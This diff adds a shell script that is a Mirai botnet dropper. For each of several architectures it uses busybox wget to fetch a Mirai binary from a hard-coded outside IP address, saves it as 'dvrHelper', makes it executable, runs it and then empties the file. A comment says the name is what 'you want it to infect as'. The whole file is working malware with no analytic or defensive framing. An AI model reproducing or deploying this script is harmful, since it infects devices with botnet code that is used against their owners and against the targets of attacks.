@@ -1,0 +1,24 @@
+#!/bin/sh
+
+HTTP_SERVER="89.34.97.10"
+HTTP_PORT=80
+BIN_NAMES="mirai.arm  mirai.arm7  mirai.arm5n  mirai.m68k  mirai.mips  mirai.mpsl  mirai.ppc  mirai.sh4  mirai.spc  mirai.x86"
+
+DROPPER_FILE_NAME="dvrHelper" #name you want it to infect as
+
+for a in $BIN_NAMES
+do
+	if [ -f "/bin/chmod" ]
+        then
+		/bin/busybox wget http://$HTTP_SERVER:$HTTP_PORT/bins/$a -O - > $DROPPER_FILE_NAME
+		chmod 777 $DROPPER_FILE_NAME
+		./$DROPPER_FILE_NAME
+		>$DROPPER_FILE_NAME
+        else
+		cp /bin/echo $DROPPER_FILE_NAME
+        	>$DROPPER_FILE_NAME
+		/bin/busybox wget http://$HTTP_SERVER:$HTTP_PORT/bins/$a -O - > $DROPPER_FILE_NAME
+		./$DROPPER_FILE_NAME
+		>$DROPPER_FILE_NAME
+	fi
+done
